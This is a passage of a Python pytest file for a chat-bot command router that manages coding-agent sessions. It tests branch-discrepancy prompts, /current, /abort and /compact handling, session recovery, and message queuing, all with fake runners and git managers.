def test_message_prompts_for_branch_discrepancy_before_running_bot_managed_session(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_md", "markdown-session", "backend", "codex", branch_name="test_branch")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=True, current_branch="main", local_branches=["main", "test_branch"])

    update = make_update(text="check formatting")
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_message(update, context))

    assert runner.resume_calls == []
    assert "Branch discrepancy detected before running the active session." in bot.messages[-1][1]
    assert "Stored branch: test_branch" in bot.messages[-1][1]
    assert "Current branch in repo: main" in bot.messages[-1][1]
    assert bot.messages[-1][3] is not None


def test_message_prefers_branch_discrepancy_prompt_over_creating_new_session(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_md", "markdown-session", "backend", "codex", branch_name="test_branch")
    store.set_current_project_folder("bot-a", 123, "backend")
    store.set_current_provider("bot-a", 123, "codex")
    store.set_current_branch("bot-a", 123, "main")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=True, current_branch="main", local_branches=["main", "test_branch"])

    update = make_update(text="check formatting")
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_message(update, context))

    assert runner.create_calls == []
    assert runner.resume_calls == []
    assert "Branch discrepancy detected before running the active session." in bot.messages[-1][1]


def test_branch_discrepancy_current_choice_updates_branch_and_resumes(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_md", "markdown-session", "backend", "codex", branch_name="test_branch")
    store.set_pending_action("bot-a", 123, {
        "kind": "message",
        "user_message": "continue",
        "branch_resolution": {
            "kind": "discrepancy",
            "session_id": "sess_md",
            "stored_branch": "test_branch",
            "current_branch": "main",
        },
    })
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=True, current_branch="main", local_branches=["main", "test_branch"])

    edited = []
    query = SimpleNamespace(
        data="branchdiscrepancy:current",
        answer=None,
        edit_message_text=None,
    )
    update = SimpleNamespace(
        effective_chat=SimpleNamespace(id=123, type="private"),
        callback_query=query,
        message=None,
    )
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    async def fake_answer():
        return None

    async def fake_edit(text, reply_markup=None):
        edited.append((text, reply_markup))

    query.answer = fake_answer
    query.edit_message_text = fake_edit

    asyncio.run(router.handle_branch_discrepancy_callback(update, context))

    assert edited[-1][0] == "Using current branch: main"
    assert runner.resume_calls
    state = store.get_chat_state("bot-a", 123)
    assert state["current_branch"] == "main"
    assert state["sessions"]["sess_md"]["branch_name"] == "main"


def test_branch_discrepancy_offers_fallback_when_stored_branch_is_missing(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_md", "markdown-session", "backend", "codex", branch_name="enhancements")
    store.set_pending_action(
        "bot-a",
        123,
        {
            "kind": "message",
            "user_message": "continue",
            "branch_resolution": {
                "kind": "discrepancy",
                "session_id": "sess_md",
                "stored_branch": "enhancements",
                "current_branch": "main",
            },
        },
    )
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=True, current_branch="main", default_branch="main", local_branches=["main"])

    edited = []
    query = SimpleNamespace(
        data="branchdiscrepancy:stored",
        answer=None,
        edit_message_text=None,
    )
    update = SimpleNamespace(
        effective_chat=SimpleNamespace(id=123, type="private"),
        callback_query=query,
        message=None,
    )
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    async def fake_answer():
        return None

    async def fake_edit(text, reply_markup=None):
        edited.append((text, reply_markup))

    query.answer = fake_answer
    query.edit_message_text = fake_edit

    asyncio.run(router.handle_branch_discrepancy_callback(update, context))

    assert "Stored branch is no longer available." in edited[-1][0]
    assert "Missing local/enhancements and origin/enhancements." in edited[-1][0]
    reply_markup = edited[-1][1]
    labels = [button.text for row in reply_markup.inline_keyboard for button in row]
    assert "local/main" in labels
    assert "origin/main" in labels
    assert len(labels) == 2


def test_branch_discrepancy_fallback_offers_default_and_current_branch_sources(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_md", "markdown-session", "backend", "codex", branch_name="enhancements")
    store.set_pending_action(
        "bot-a",
        123,
        {
            "kind": "message",
            "user_message": "continue",
            "branch_resolution": {
                "kind": "discrepancy",
                "session_id": "sess_md",
                "stored_branch": "enhancements",
                "current_branch": "feature-x",
            },
        },
    )
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=True, current_branch="feature-x", default_branch="main", local_branches=["main", "feature-x"])

    edited = []
    query = SimpleNamespace(
        data="branchdiscrepancy:stored",
        answer=None,
        edit_message_text=None,
    )
    update = SimpleNamespace(
        effective_chat=SimpleNamespace(id=123, type="private"),
        callback_query=query,
        message=None,
    )
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    async def fake_answer():
        return None

    async def fake_edit(text, reply_markup=None):
        edited.append((text, reply_markup))

    query.answer = fake_answer
    query.edit_message_text = fake_edit

    asyncio.run(router.handle_branch_discrepancy_callback(update, context))

    reply_markup = edited[-1][1]
    labels = [button.text for row in reply_markup.inline_keyboard for button in row]
    assert "local/main" in labels
    assert "origin/main" in labels
    assert "local/feature-x" in labels
    assert "origin/feature-x" in labels


def test_branch_discrepancy_fallback_branch_source_resumes_pending_run(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_md", "markdown-session", "backend", "codex", branch_name="enhancements")
    store.set_pending_action(
        "bot-a",
        123,
        {
            "kind": "message",
            "user_message": "continue",
            "branch_resolution": {
                "kind": "switch_source",
                "source_branch": "main",
                "new_branch": "enhancements",
            },
        },
    )
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(
        is_git_repo=True,
        current_branch="main",
        default_branch="main",
        local_branches=["main"],
        prepare_from_source_result=SimpleNamespace(
            success=True,
            message="Created branch 'enhancements' from origin/main.",
            current_branch="enhancements",
            default_branch="main",
        ),
    )

    edited = []
    query = SimpleNamespace(
        data="branchsource:origin:main:enhancements",
        answer=None,
        edit_message_text=None,
    )
    update = SimpleNamespace(
        effective_chat=SimpleNamespace(id=123, type="private"),
        callback_query=query,
        message=None,
    )
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    async def fake_answer():
        return None

    async def fake_edit(text, reply_markup=None):
        edited.append((text, reply_markup))

    query.answer = fake_answer
    query.edit_message_text = fake_edit

    asyncio.run(router.handle_branch_source_callback(update, context))

    assert "Created branch 'enhancements' from origin/main." in edited[-1][0]
    assert runner.resume_calls
    state = store.get_chat_state("bot-a", 123)
    assert state["current_branch"] == "enhancements"
    assert state["sessions"]["sess_md"]["branch_name"] == "enhancements"


@pytest.mark.parametrize(
    ("source_kind", "source_branch"),
    [
        ("local", "main"),
        ("origin", "main"),
        ("local", "feature-x"),
        ("origin", "feature-x"),
    ],
)
def test_branch_discrepancy_fallback_source_options_resume_pending_run(
    tmp_path: Path,
    source_kind: str,
    source_branch: str,
):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_md", "markdown-session", "backend", "codex", branch_name="enhancements")
    store.set_pending_action(
        "bot-a",
        123,
        {
            "kind": "message",
            "user_message": "continue",
            "branch_resolution": {
                "kind": "switch_source",
                "new_branch": "enhancements",
            },
        },
    )
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(
        is_git_repo=True,
        current_branch="feature-x",
        default_branch="main",
        local_branches=["main", "feature-x"],
        prepare_from_source_result=SimpleNamespace(
            success=True,
            message=f"Created branch 'enhancements' from {source_kind}/{source_branch}.",
            current_branch="enhancements",
            default_branch="main",
        ),
    )

    edited = []
    query = SimpleNamespace(
        data=f"branchsource:{source_kind}:{source_branch}:enhancements",
        answer=None,
        edit_message_text=None,
    )
    update = SimpleNamespace(
        effective_chat=SimpleNamespace(id=123, type="private"),
        callback_query=query,
        message=None,
    )
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    async def fake_answer():
        return None

    async def fake_edit(text, reply_markup=None):
        edited.append((text, reply_markup))

    query.answer = fake_answer
    query.edit_message_text = fake_edit

    asyncio.run(router.handle_branch_source_callback(update, context))

    assert f"Created branch 'enhancements' from {source_kind}/{source_branch}." in edited[-1][0]
    assert router.git.prepare_from_source_calls[-1][1:] == (source_kind, source_branch, "enhancements")
    assert runner.resume_calls
    state = store.get_chat_state("bot-a", 123)
    assert state["current_branch"] == "enhancements"
    assert state["sessions"]["sess_md"]["branch_name"] == "enhancements"


def test_branch_source_failure_during_discrepancy_offers_fallback_prompt(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_md", "markdown-session", "backend", "codex", branch_name="enhancements")
    store.set_pending_action(
        "bot-a",
        123,
        {
            "kind": "message",
            "user_message": "continue",
            "branch_resolution": {
                "kind": "switch_source",
                "source_branch": "enhancements",
                "new_branch": "enhancements",
            },
        },
    )
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(
        is_git_repo=True,
        current_branch="main",
        default_branch="main",
        local_branches=["main"],
        prepare_from_source_result=SimpleNamespace(
            success=False,
            message="fatal: couldn't find remote ref enhancements",
            current_branch=None,
            default_branch="main",
        ),
    )

    edited = []
    query = SimpleNamespace(
        data="branchsource:origin:enhancements:enhancements",
        answer=None,
        edit_message_text=None,
    )
    update = SimpleNamespace(
        effective_chat=SimpleNamespace(id=123, type="private"),
        callback_query=query,
        message=None,
    )
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    async def fake_answer():
        return None

    async def fake_edit(text, reply_markup=None):
        edited.append((text, reply_markup))

    query.answer = fake_answer
    query.edit_message_text = fake_edit

    asyncio.run(router.handle_branch_source_callback(update, context))

    assert "fatal: couldn't find remote ref enhancements" in edited[-1][0]
    assert "Do you want to create branch enhancements from one of these branches instead of origin/enhancements?" in edited[-1][0]
    labels = [button.text for row in edited[-1][1].inline_keyboard for button in row]
    assert "local/main" in labels
    assert "origin/main" in labels


def test_current_reports_missing_active_session(tmp_path: Path):
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    update = make_update(text="/current")
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_current(update, context))

    assert bot.messages[-1][1] == "No active session.\nPlease run /project and /new first."


def test_current_reports_active_session_details(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_current", "current-session", "backend", "codex", branch_name="feature-1")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    update = make_update(text="/current")
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_current(update, context))

    assert "Current session: current-session" in bot.messages[-1][1]
    assert "Session ID: sess_current" in bot.messages[-1][1]
    assert "Project: backend" in bot.messages[-1][1]
    assert "Provider: codex" in bot.messages[-1][1]
    assert "Branch: feature-1" in bot.messages[-1][1]


def test_abort_reports_when_no_project_selected(tmp_path: Path):
    runner = DummyRunner()
    runner.abort_running_process = lambda _project_path: False
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    update = make_update(text="/abort")
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_abort(update, context))

    assert bot.messages[-1][1] == "No project selected.\nPlease run /project &lt;project_folder&gt; first."


def test_abort_reports_when_no_running_process_exists(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    runner.abort_running_process = lambda _project_path: False
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.set_current_project_folder("bot-a", 123, "backend")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    update = make_update(text="/abort")
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_abort(update, context))

    assert bot.messages[-1][1] == "No running agent process was found for the current project."


def test_abort_sends_signal_for_current_project_run(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    aborted_paths = []
    runner.abort_running_process = lambda project_path: aborted_paths.append(project_path) or True
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.set_current_project_folder("bot-a", 123, "backend")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    update = make_update(text="/abort")
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_abort(update, context))

    assert aborted_paths == [backend]
    assert bot.messages[-1][1] == "Abort signal sent for the current project run."


def test_compact_reports_usage_when_args_are_passed(tmp_path: Path):
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    update = make_update(text="/compact extra")
    bot = FakeBot()
    context = SimpleNamespace(args=["extra"], bot=bot)

    asyncio.run(router.handle_compact(update, context))

    assert bot.messages[-1][1] == "Usage: /compact"


@pytest.mark.parametrize("provider", ["codex", "copilot"])
def test_compact_creates_fresh_session_from_summary(tmp_path: Path, provider: str):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = CompactingRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_current", "current-session", "backend", provider)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=False)

    update = make_update(text="/compact")
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_compact(update, context))

    assert runner.resume_calls[-1]["provider"] == provider
    assert runner.resume_calls[-1]["session_id"] == "sess_current"
    assert "compact handoff summary" in runner.resume_calls[-1]["user_message"].lower()
    assert runner.create_calls[-1]["provider"] == provider
    assert "Use this compact handoff summary" in runner.create_calls[-1]["user_message"]
    state = store.get_chat_state("bot-a", 123)
    assert state["active_session_id"] == "sess_compacted"
    assert state["sessions"]["sess_compacted"]["name"] == "current-session-1"
    assert "Session compacted successfully." in bot.messages[-1][1]


def test_assistant_command_block_is_sent_separately(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = CommandBlockRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_cmd", "command-session", "backend", "codex")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=False)

    update = make_update(text="give me the command")
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_message(update, context))

    assert any(message[1] == "Command (2/2)" for message in bot.messages)
    assert any("git commit -m &quot;test&quot;" in message[1] for message in bot.messages)


def test_successful_resume_creates_new_session_and_switches_active_session(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = SessionIdRotatingRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_original", "rotating-session", "backend", "codex")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=False)

    update = make_update(text="keep going")
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_message(update, context))

    state = store.get_chat_state("bot-a", 123)
    assert state["active_session_id"] == "sess_rotated"
    assert "sess_rotated" in state["sessions"]
    assert "sess_original" in state["sessions"]
    assert state["sessions"]["sess_rotated"]["name"] == "rotating-session-1"
    assert "Resume succeeded, but the session ID changed." in bot.messages[1][1]
    assert "New session ID: sess_rotated" in bot.messages[1][1]
    assert "New session name: rotating-session-1" in bot.messages[1][1]


def test_invalid_resume_recovery_creates_new_session_and_switches_active_session(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = ResumeReplacementRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_original", "recover-session", "backend", "codex")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=False)

    update = make_update(text="keep going")
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_message(update, context))

    state = store.get_chat_state("bot-a", 123)
    assert state["active_session_id"] == "sess_abc123"
    assert "sess_original" in state["sessions"]
    assert state["sessions"]["sess_abc123"]["name"] == "recover-session-1"
    assert "Resume failed, so a new session was created." in bot.messages[1][1]
    assert "New session ID: sess_abc123" in bot.messages[1][1]
    assert "New session name: recover-session-1" in bot.messages[1][1]


def test_invalid_resume_recovery_uses_next_available_suffix_for_new_session_name(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = ResumeReplacementRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_original", "recover-session", "backend", "codex")
    store.create_session("bot-a", 123, "sess_existing", "recover-session-1", "backend", "codex")
    store.switch_session("bot-a", 123, "sess_original")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=False)

    update = make_update(text="keep going")
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_message(update, context))

    state = store.get_chat_state("bot-a", 123)
    assert state["active_session_id"] == "sess_abc123"
    assert state["sessions"]["sess_abc123"]["name"] == "recover-session-2"


def test_active_session_reports_stalled_agent_process(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = StallingRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_stall", "stall-session", "backend", "codex")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=False)

    update = make_update(text="continue")
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_message(update, context))

    assert any("The current agent run appears stuck." in message[1] for message in bot.messages)
    assert any("hidden permission dialog" in message[1] for message in bot.messages)


def test_active_session_deletes_live_progress_message_when_final_output_is_sent(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = ProgressRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_progress", "progress-session", "backend", "codex")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=False)

    update = make_update(text="continue")
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_message(update, context))

    assert len(bot.deleted_messages) == 1
    assert bot.deleted_messages[0][0] == 123
    assert any("Codex output" in message[1] for message in bot.messages)


def test_second_message_is_queued_while_first_run_is_still_running(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = BlockingRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_queue", "queue-session", "backend", "codex")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=False)

    async def exercise():
        bot = FakeBot()
        first_update = make_update(text="first question")
        second_update = make_update(text="second question")
        first_context = SimpleNamespace(args=[], bot=bot)
        second_context = SimpleNamespace(args=[], bot=bot)

        first_task = asyncio.create_task(router.handle_message(first_update, first_context))
        started = await asyncio.to_thread(runner.wait_started, 1, 1.0)
        assert started is True

        await router.handle_message(second_update, second_context)

        assert any("Question queued as Q1." in message for _, message, _, _ in bot.messages)
        assert not any("Working on queued questions:" in message for _, message, _, _ in bot.messages)
        assert not any("already running on project" in message for _, message, _, _ in bot.messages)
        assert not any("Command failed" in message for _, message, _, _ in bot.messages)

        runner.release_next()
        started_second = await asyncio.to_thread(runner.wait_started, 2, 1.0)
        assert started_second is True
        runner.release_next()
        await first_task

        assert len(runner.resume_calls) == 2
        assert runner.resume_calls[0]["user_message"] == "first question"
        assert runner.resume_calls[1]["user_message"] == "second question"
        assert any("Working on queued questions:" in message for _, message, _, _ in bot.messages)
        assert any("1. second question" in message for _, message, _, _ in bot.messages)

    asyncio.run(exercise())


def test_grouped_queue_batch_requires_user_decision_then_processes_remaining_queue(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = BlockingRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_queue", "queue-session", "backend", "codex")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=False)

    async def exercise():
        bot = FakeBot()
        first_update = make_update(text="first question")
        second_update = make_update(text="two")
        third_update = make_update(text="three")
        fourth_update = make_update(text="four four four four four four four")
        first_context = SimpleNamespace(args=[], bot=bot)

        first_task = asyncio.create_task(router.handle_message(first_update, first_context))
        started = await asyncio.to_thread(runner.wait_started, 1, 1.0)
        assert started is True

        await router.handle_message(second_update, SimpleNamespace(args=[], bot=bot))
        await router.handle_message(third_update, SimpleNamespace(args=[], bot=bot))
        runner.release_next()
        await first_task

        prompt_messages = [entry for entry in bot.messages if "Multiple queued questions are ready." in entry[1]]
        assert len(prompt_messages) == 1
        keyboard = prompt_messages[0][3]
        assert keyboard is not None
        buttons = keyboard.inline_keyboard[0]
        assert buttons[0].callback_data == "queuebatch:group"
        assert buttons[1].callback_data == "queuebatch:single"
        assert buttons[2].callback_data == "queuebatch:cancel"

        answers = []
        edited = []
        callback_update = SimpleNamespace(
            effective_chat=SimpleNamespace(id=123, type="private"),
            callback_query=SimpleNamespace(data="queuebatch:group", answer=None, edit_message_text=None),
        )

        async def fake_answer():
            answers.append("answered")

        async def fake_edit(text):
            edited.append(text)

        callback_update.callback_query.answer = fake_answer
        callback_update.callback_query.edit_message_text = fake_edit

        callback_task = asyncio.create_task(router.handle_queue_batch_callback(callback_update, SimpleNamespace(args=[], bot=bot)))
        started_second = await asyncio.to_thread(runner.wait_started, 2, 1.0)
        assert started_second is True
        await router.handle_message(fourth_update, SimpleNamespace(args=[], bot=bot))
        runner.release_next()
        await callback_task
        started_third = await asyncio.to_thread(runner.wait_started, 3, 1.0)
        assert started_third is True
        runner.release_next()

        assert len(runner.resume_calls) == 3
        assert runner.resume_calls[0]["user_message"] == "first question"
        assert "Answer the following queued user questions in order." in runner.resume_calls[1]["user_message"]
        assert "[Question 1]\ntwo\n[End Question 1]" in runner.resume_calls[1]["user_message"]
        assert "[Question 2]\nthree\n[End Question 2]" in runner.resume_calls[1]["user_message"]
        assert runner.resume_calls[2]["user_message"] == "four four four four four four four"
        assert answers == ["answered"]
        assert edited == ["Processing the queued questions as one batch."]
        queued_notices = [message for _, message, _, _ in bot.messages if "Working on queued questions:" in message]
        assert any("1. two" in message and "2. three" in message for message in queued_notices)
        assert any("1. four four four four four four four" in message for message in queued_notices)

    asyncio.run(exercise())


def test_single_queue_batch_choice_processes_remaining_questions_without_reprompt(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = BlockingRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_queue", "queue-session", "backend", "codex")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=False)

    async def exercise():
        bot = FakeBot()
        first_task = asyncio.create_task(router.handle_message(make_update(text="first question"), SimpleNamespace(args=[], bot=bot)))
        started = await asyncio.to_thread(runner.wait_started, 1, 1.0)
        assert started is True

        await router.handle_message(make_update(text="two"), SimpleNamespace(args=[], bot=bot))
        await router.handle_message(make_update(text="three"), SimpleNamespace(args=[], bot=bot))
        await router.handle_message(make_update(text="four"), SimpleNamespace(args=[], bot=bot))
        runner.release_next()
        await first_task

        prompt_messages = [entry for entry in bot.messages if "Multiple queued questions are ready." in entry[1]]
        assert len(prompt_messages) == 1

        answers = []
        edited = []
        callback_update = SimpleNamespace(
            effective_chat=SimpleNamespace(id=123, type="private"),
            callback_query=SimpleNamespace(data="queuebatch:single", answer=None, edit_message_text=None),
        )

        async def fake_answer():
            answers.append("answered")

        async def fake_edit(text):
            edited.append(text)

        callback_update.callback_query.answer = fake_answer
        callback_update.callback_query.edit_message_text = fake_edit

        callback_task = asyncio.create_task(
            router.handle_queue_batch_callback(callback_update, SimpleNamespace(args=[], bot=bot))
        )

        started_second = await asyncio.to_thread(runner.wait_started, 2, 1.0)
        assert started_second is True
        runner.release_next()

        started_third = await asyncio.to_thread(runner.wait_started, 3, 1.0)
        assert started_third is True
        runner.release_next()

        started_fourth = await asyncio.to_thread(runner.wait_started, 4, 1.0)
        assert started_fourth is True
        runner.release_next()
        await callback_task

        assert len(runner.resume_calls) == 4
        assert runner.resume_calls[0]["user_message"] == "first question"
        assert runner.resume_calls[1]["user_message"] == "two"
        assert runner.resume_calls[2]["user_message"] == "three"
        assert runner.resume_calls[3]["user_message"] == "four"
        assert answers == ["answered"]
        assert edited == ["Processing the queued questions one by one."]
        assert len([entry for entry in bot.messages if "Multiple queued questions are ready." in entry[1]]) == 1

    asyncio.run(exercise())


def test_cancel_queue_batch_discards_pending_batch(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = BlockingRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_queue", "queue-session", "backend", "codex")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=False)

    async def exercise():
        bot = FakeBot()
        first_task = asyncio.create_task(router.handle_message(make_update(text="first question"), SimpleNamespace(args=[], bot=bot)))
        started = await asyncio.to_thread(runner.wait_started, 1, 1.0)
        assert started is True

        await router.handle_message(make_update(text="two"), SimpleNamespace(args=[], bot=bot))
        await router.handle_message(make_update(text="three"), SimpleNamespace(args=[], bot=bot))
        runner.release_next()
        await first_task

        prompt_messages = [entry for entry in bot.messages if "Multiple queued questions are ready." in entry[1]]
        assert len(prompt_messages) == 1

        answers = []
        edited = []
        callback_update = SimpleNamespace(
            effective_chat=SimpleNamespace(id=123, type="private"),
            callback_query=SimpleNamespace(data="queuebatch:cancel", answer=None, edit_message_text=None),
        )

        async def fake_answer():
            answers.append("answered")

        async def fake_edit(text):
            edited.append(text)

        callback_update.callback_query.answer = fake_answer
        callback_update.callback_query.edit_message_text = fake_edit

        await router.handle_queue_batch_callback(callback_update, SimpleNamespace(args=[], bot=bot))

        assert len(runner.resume_calls) == 1
        assert answers == ["answered"]
        assert edited == ["Queued questions were cancelled."]
        assert router._chat_pending_queue_decisions == {}

    asyncio.run(exercise())


def test_aborted_run_with_pending_queue_prompts_before_continuing(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = AbortableBlockingRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_queue", "queue-session", "backend", "codex")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
